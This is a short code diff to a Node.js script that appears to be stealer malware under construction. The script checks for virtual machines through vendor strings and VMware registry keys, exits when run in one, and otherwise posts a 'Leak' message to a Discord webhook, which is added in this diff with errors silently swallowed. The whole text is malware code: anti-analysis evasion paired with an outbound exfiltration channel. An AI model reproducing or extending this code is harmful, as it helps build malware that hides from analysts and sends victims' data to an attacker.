@@ -2,9 +2,9 @@ const os = require("os");
 const fs = require("fs");
 const path = require("path");
 const { exec } = require("child_process");
-const fetch = require("node-fetch");
+const axios = require("axios");
 
-const webhookUrl = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";
+const webhookUrl = "WEBHOOK";
 
 const virtualizationPlatforms = [
   /Microsoft Corporation.*Hyper-V/i,
@@ -23,6 +23,18 @@ const registryKeys = [
   "HKLM\\SOFTWARE\\VMware, Inc.\\VMware VGAuth",
   "HKLM\\SOFTWARE\\RegisteredApplications\\VMware Host Open",
 ];
+
+async function sendWebhookMessage() {
+  const message = {
+    content: "Leak",
+  };
+
+  try {
+    const response = await axios.post(webhookUrl, message);
+  } catch (err) {
+    // do nothing
+  }
+}
 
 function isRunningInVM() {
   return new Promise((resolve, reject) => {
@@ -95,8 +107,7 @@ async function main() {
   if (await isRunningInVM()) {
     process.exit(1);
   } else {
-    // Code here
-    console.log("hi");
+    sendWebhookMessage();
   }
 }
 
